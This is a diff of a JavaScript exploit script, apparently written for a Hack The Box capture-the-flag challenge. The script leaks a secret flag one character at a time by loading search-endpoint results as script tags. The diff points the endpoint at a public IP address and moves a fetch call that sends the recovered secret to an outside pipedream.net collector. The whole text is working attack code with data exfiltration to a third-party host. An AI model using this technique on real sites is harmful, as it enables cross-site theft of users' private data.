@@ -4,7 +4,7 @@ var chars =
 var special = "_";
 var charLen = chars.length;
 var ENDPOINT =
-	"http://127.0.0.1:30753/api/entries/search?q=";
+	"http://161.35.173.232:30753/api/entries/search?q=";
 
 var flag = "HTB{";
 
@@ -15,10 +15,6 @@ const getPartial = (char) => {
 		document.head.appendChild(script);
 
 		script.onload = () => {
-			fetch("https://enancxlxuxj2.x.pipedream.net/flag=" + flag + char, {
-				method: "GET",
-				mode: "no-cors",
-			});
 			resolve(char);
 		};
 		script.onerror = () => {
@@ -47,7 +43,14 @@ const exploit = async () => {
 			.catch((e) => null);
 
 		if (b) {
-			console.log(flag);
+			// console.log(flag);
+			fetch(
+				"https://enancxlxuxj2.x.pipedream.net/flag=" + flag,
+				{
+					method: "GET",
+					mode: "no-cors",
+				}
+			);
 			break;
 		}
 	}
